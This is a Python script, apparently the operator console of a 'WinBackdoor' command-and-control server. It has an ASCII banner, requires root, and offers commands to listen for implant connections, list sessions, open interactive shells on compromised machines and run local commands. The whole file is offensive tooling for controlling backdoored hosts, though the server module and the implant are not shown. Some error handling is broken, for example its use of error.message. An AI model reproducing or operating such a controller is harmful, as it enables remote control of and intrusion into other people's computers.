#!/usr/bin/python3
#-*- coding:utf-8 -*-

try:
    from C2C_Server import *
except ImportError:
    print("(+) Error : C2C_Server Not Found !")

__SERVER_VERSION__ = "\033[38;5;196m0.1 (beta)\033[00m"
__AUTHOR__ = "\033[38;5;196mUnam3dd \033[00m"
__GITHUB__ = "\033[38;5;196mhttps://github.com/%s \033[00m" % (__AUTHOR__)

banner = '''
\033[38;5;85m
 █     █░ ██▓ ███▄    █  ▄▄▄▄   ▓█████▄  ▄████▄   ▄████▄  
▓█░ █ ░█░▓██▒ ██ ▀█   █ ▓█████▄ ▒██▀ ██▌▒██▀ ▀█  ▒██▀ ▀█  
▒█░ █ ░█ ▒██▒▓██  ▀█ ██▒▒██▒ ▄██░██   █▌▒▓█    ▄ ▒▓█    ▄ 
░█░ █ ░█ ░██░▓██▒  ▐▌██▒▒██░█▀  ░▓█▄   ▌▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
░░██▒██▓ ░██░▒██░   ▓██░░▓█  ▀█▓░▒████▓ ▒ ▓███▀ ░▒ ▓███▀ ░
░ ▓░▒ ▒  ░▓  ░ ▒░   ▒ ▒ ░▒▓███▀▒ ▒▒▓  ▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
  ▒ ░ ░   ▒ ░░ ░░   ░ ▒░▒░▒   ░  ░ ▒  ▒   ░  ▒     ░  ▒   
  ░   ░   ▒ ░   ░   ░ ░  ░    ░  ░ ░  ░ ░        ░        
    ░     ░           ░  ░         ░    ░ ░      ░ ░      
                              ░  ░      ░        ░\033[00m        
            

            Simple Command & Control Server MultiThreaded
             Github  : %s 
             Author  : %s 
             Version : %s 
''' % (__GITHUB__,__AUTHOR__,__SERVER_VERSION__)

if __name__ == "__main__":
    try:
        server = C2C_Server()
        
        if server.get_username() != "root":
            print("\033[[!] Error This script must be run with root permissions")
            sys.exit()
        else:
            pass

        hostname = platform.node()
        server.clear()
        server.clear()
        my_ip = socket.gethostbyname(hostname)
        print(banner)
        readline.set_completer(SimpleCompleter(['help','exit','quit','?','listen','monitor','sessions','shell',my_ip]).complete)
        readline.parse_and_bind('tab: complete')
        while True:
            t = datetime.now().strftime("%H:%M:%S")
            try:
                cmd = str(input("\033[38;5;87m\u03bb C2C@%s [\033[38;5;85m%s\033[38;5;87m]\033[00m\n\033[38;5;85m\u276f \033[00m" % (t,hostname)))

                if cmd == "quit" or cmd == "exit":
                    print("\033[38;5;85m[\033[34m*\033[38;5;85m] Thanks for Using Command & Control WinBackdoor Server\033[00m")
                    i = 0
                    while i < len(socket_fd_list):
                        del socket_fd_list[i]
                        i = i + 1
                    sys.exit(1)

                elif cmd =="help":
                    server.show_help()
                    pass

                elif cmd.startswith("listen")==True or cmd.startswith("monitor")==True:
                    try:
                        split = shlex.split(cmd)
                        server.thread_listen_new_connection(split[1],split[2])
                    except Exception as error_listen:
                        print(error_listen)
                
                elif cmd =="clear" or cmd =="cls":
                    try:
                        server.clear()
                    except Exception as error_server:
                        print(error_server)
                
                elif cmd.startswith("shell")==True:
                    print("\033[38;5;85m[\033[34m*\033[38;5;85m] For keep sessions in background press CTRL+C")
                    try:
                        split = shlex.split(cmd)
                        if len(split) ==2:
                            conn_nc = int(split[1])
                            server.interact_session(id_vector[conn_nc])
                            close_session = str(input("\n[+] Do you want close session (y/n) >>> "))

                            if close_session.startswith("y")==True:
                                del id_vector[conn_nc]
                            else:
                                pass

                    except Exception as error_popshell:
                        print(error_popshell.message)
                
                elif cmd =="":
                    pass

                
                elif cmd == "sessions":
                    try:
                        server.list_connection()
                    except Exception as error_sessions:
                        print(error_sessions.message)
                
                elif cmd.startswith('!')==True:
                    try:
                        split = cmd.split("!")
                        local_command = server.execute_local_command(split[1])
                        print("\033[38;5;85m[\033[34m+\033[38;5;85m] Command Executed : %s" % (split[1]))
                        print(local_command.decode("utf-8"))
                    except Exception as error_cmd:
                        print(error_cmd.message)

                else:
                    print("[*] Error : Command not found !")

            except KeyboardInterrupt:
                print("\033[38;5;196m(!) Error : type 'quit' or 'exit' for Exit C2C Server !\033[00m")

    except Exception as error_c2c_server:
        print("[!] Error : %s" % (error_c2c_server))